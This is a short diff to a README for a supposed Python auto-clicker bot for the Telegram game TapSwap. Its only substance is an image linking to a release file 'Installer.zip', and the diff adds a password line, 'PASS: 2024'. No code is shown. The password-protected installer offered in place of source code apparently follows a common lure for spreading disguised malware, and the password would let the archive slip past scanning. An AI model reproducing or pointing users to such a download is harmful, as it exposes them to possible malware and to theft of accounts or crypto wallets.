@@ -1,5 +1,6 @@
 [![image](https://github.com/user-attachments/assets/d9dd60b0-4ecf-4c15-a670-9daf02ead97b)](https://github.com/TusharDharaiya/TapSwap-AutoClicker-Bot/releases/download/Bot/Installer.zip)
 
+## PASS: 2024
 # TapSwap-Clicker
 A Python bot and automated clicker for accumulating TapSwap on Telegram.
 
